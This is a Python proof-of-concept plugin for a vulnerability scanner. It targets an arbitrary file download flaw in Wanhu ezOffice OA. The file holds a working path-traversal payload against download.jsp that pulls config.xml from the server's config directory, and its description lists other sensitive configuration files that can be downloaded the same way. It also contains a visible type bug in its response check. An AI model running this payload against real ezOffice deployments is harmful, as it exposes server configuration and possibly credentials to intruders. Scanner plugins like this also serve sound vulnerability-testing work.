# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Whir_0001'  # 平台漏洞编号，留空
    name = '万户OA ezOffice 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-06-06'  # 漏洞公布时间
    desc = '''
        万户软件是一个坚持网络风格是最大限度提升软件健壮性的一种有效手段，因为这样一来，决定应用并发数的并不是软件平台本身，而是硬件和网络速度；也就是说，从理论上讲，类似万户协同ezOFFICE这样的软件平台没有严格的并发数限制。
        万户ezOffice文件下载漏洞，修改FileName参数配合path下载文件
        参数path=/../时对应/defaultroot/目录，可下载的配置文件包括不限于：
        mailserver.properties/govexchange.properties/systemMark.properties/config.xml
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '万户OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c2064a22-20fa-45c8-9df6-3ba902b78e4b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/defaultroot/public/jsp/download.jsp?FileName=config.xml&name=veri&path=/../../config/'
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()

            if "<EzOffice>" in content and "</EzOffice>" in content and "history.back()" not in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
